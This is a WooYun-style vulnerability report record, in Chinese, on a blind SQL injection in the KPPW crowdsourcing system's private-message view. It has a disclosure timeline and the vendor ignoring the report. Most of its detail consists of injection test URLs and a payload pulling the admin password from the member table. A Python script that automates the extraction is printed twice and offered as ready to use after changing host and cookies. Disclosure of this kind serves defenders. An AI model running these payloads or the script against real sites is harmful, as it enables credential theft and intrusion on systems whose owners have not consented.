{"id": 48784, "wybug_id": "wooyun-2014-076782", "wybug_title": "KPPW开源威客系统绕过防护盲注", "wybug_corp": "keke.com", "wybug_author": "JJ Fly", "wybug_date": "2014-09-21 01:14", "wybug_open_date": "2014-12-17 01:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向公众公开  简要描述： KPPW开源威客系统 绕过防护盲注 详细说明：  1. WooYun: kppw一处sql注入 厂商对这个漏洞进行了修复。替换了union 不能进行联合了但是可以进行盲注。同一个类型，多点。不过问题都出在消息这。2.注册两个帐号，然后其中一个对另外那个发送3个消息。\n\n3.打开中间那条   url如下http://192.168.1.101/KPPW/index.php?do=user&view=message&op=detail&type=private&intPage=1&msgId=16然后尝试注入\n\n下面我们可以看到 上一条 和 下一条 。注入测试http://192.168.1.101/KPPW/index.php?do=user&view=message&op=detail&type=private&intPage=1&msgId=16 and 1=1--\n\n存在。http://192.168.1.101/KPPW/index.php?do=user&view=message&op=detail&type=private&intPage=1&msgId=16 and 1=2--\n\n消失了。3.主要利用urlhttp://192.168.1.101/KPPW/index.php?do=user&view=message&op=detail&type=private&intPage=1&msgId=16 and (select CHAR(48))=SUBSTR((SELECT `password` from keke_witkey_member WHERE uid =1),1,1)--下面 写了一个小工具 替换下host url cookies就可以用了。\n#coding:utf-8import httplibdef get(i1,i2):\tpage=\"\"\trHtml=httplib.HTTPConnection(\"192.168.1.101\",80,False)\turl=\"/KPPW/index.php?do=user&view=message&op=detail&type=notice&intPage=1&msgId=13%20and%20%28select%20CHAR%28\"+i1+\"%29%29=SUBSTR%28%28SELECT%20%60password%60%20from%20keke_witkey_member%20WHERE%20uid%20=1%29,\"+i2+\",1%29--\"\t#print url\trHtml.request(\"GET\",url,headers={\"User-Agent\":\"Firefox/22.0\",\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\"Accept-Language\":\"en-US,en;q=0.5\",\"Accept-Encoding\":\"gzip, deflate\",\"Cookie\":\"PHPSESSID=x\",\"Connection\":\"keep-alive\"})\tpage=rHtml.getresponse(False)\treturn page.read().count('一条')mm=[]for i in range(1,33):\tfor ii in range(48,123):\t\tif(get(str(ii),str(i))!=0):\t\t\tmm.append(chr(ii))\t\t\tprint \"\".join(mm)\t\t\tbreak\n\n\n   漏洞证明：  \n#coding:utf-8import httplibdef get(i1,i2):\tpage=\"\"\trHtml=httplib.HTTPConnection(\"192.168.1.101\",80,False)\turl=\"/KPPW/index.php?do=user&view=message&op=detail&type=notice&intPage=1&msgId=13%20and%20%28select%20CHAR%28\"+i1+\"%29%29=SUBSTR%28%28SELECT%20%60password%60%20from%20keke_witkey_member%20WHERE%20uid%20=1%29,\"+i2+\",1%29--\"\t#print url\trHtml.request(\"GET\",url,headers={\"User-Agent\":\"Firefox/22.0\",\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\"Accept-Language\":\"en-US,en;q=0.5\",\"Accept-Encoding\":\"gzip, deflate\",\"Cookie\":\"PHPSESSID=x\",\"Connection\":\"keep-alive\"})\tpage=rHtml.getresponse(False)\treturn page.read().count('一条')mm=[]for i in range(1,33):\tfor ii in range(48,123):\t\tif(get(str(ii),str(i))!=0):\t\t\tmm.append(chr(ii))\t\t\tprint \"\".join(mm)\t\t\tbreak\n\n\n   修复方案：  \n转换成int\n   版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-17 01:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}